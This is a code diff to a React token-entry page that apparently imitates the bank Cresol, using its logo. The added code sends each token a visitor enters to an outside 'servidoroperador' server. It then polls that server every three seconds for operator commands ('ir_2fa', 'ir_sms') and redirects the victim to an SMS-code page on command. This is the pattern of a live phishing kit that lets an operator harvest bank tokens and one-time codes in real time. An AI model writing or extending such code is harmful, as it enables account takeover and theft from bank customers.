@@ -1,8 +1,67 @@
+
 import React, { useState, useEffect } from "react";
 import { ArrowLeft } from "lucide-react";
 import { useNavigate } from "react-router-dom";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
+
+// Função para monitorar cliente continuamente na página Token
+const monitorClientToken = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
+  console.log(`Iniciando monitoramento Token do cliente: ${clientId}`);
+  
+  let intervalId: NodeJS.Timeout;
+  
+  const monitor = async () => {
+    try {
+      console.log(`Consultando dados do cliente ${clientId} na página Token...`);
+      
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
+        method: 'GET',
+        headers: {
+          'Content-Type': 'application/json',
+        }
+      });
+
+      console.log(`Status da consulta Token: ${response.status}`);
+      
+      if (response.ok) {
+        const clientData = await response.json();
+        console.log('Dados do cliente Token recebidos:', clientData);
+        console.log('Valor do response Token:', clientData.data?.response);
+        console.log('Valor do command Token:', clientData.data?.command);
+        
+        // Na página Token: se receber ir_2fa, continua monitorando; aguarda próximo comando para redirecionar
+        if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
+          console.log('Detectado ir_2fa na página Token - Continuando monitoramento...');
+        }
+        
+        // Se receber ir_sms, redireciona para SMS
+        if (clientData.data?.response === "ir_sms" || clientData.data?.command === "ir_sms") {
+          console.log('Detectado ir_sms na página Token - Redirecionando para /sms');
+          clearInterval(intervalId);
+          console.log('Monitoramento Token parado - redirecionando...');
+          navigate('/sms');
+          return;
+        }
+        
+        console.log('Continuando monitoramento Token...');
+      } else {
+        const errorData = await response.text();
+        console.log('Erro na consulta Token do cliente:', errorData);
+      }
+
+    } catch (error) {
+      console.log('Erro durante consulta Token do cliente:', error);
+    }
+  };
+
+  // Executar primeira consulta imediatamente
+  await monitor();
+  
+  // Configurar monitoramento contínuo a cada 3 segundos
+  intervalId = setInterval(monitor, 3000);
+  console.log('Monitoramento Token contínuo configurado (3 segundos)');
+};
 
 const TokenPage = () => {
   const [token, setToken] = useState("");
@@ -29,28 +88,29 @@ const TokenPage = () => {
     }
 
     try {
-      console.log('Enviando token para validação:', token);
+      console.log('Enviando token via external-response:', token);
       console.log('ClientId utilizado:', clientId);
       
-      // Aqui você pode enviar o token para a API usando o clientId
-      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/token`, {
-        method: 'POST',
+      // Enviar token para a API usando external-response
+      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
+        method: 'PATCH',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          token: token
+          response: token
         })
       });
 
       if (response.ok) {
-        console.log('Token validado com sucesso');
-        // Redirecionar para o dashboard ou página principal após login
+        console.log('Token enviado com sucesso via external-response');
+        // Iniciar monitoramento contínuo após envio bem-sucedido
+        await monitorClientToken(clientId, navigate);
       } else {
-        console.log('Erro ao validar token');
+        console.log('Erro ao enviar token via external-response');
       }
     } catch (error) {
-      console.log('Erro durante validação do token:', error);
+      console.log('Erro durante envio do token:', error);
     }
   };
 
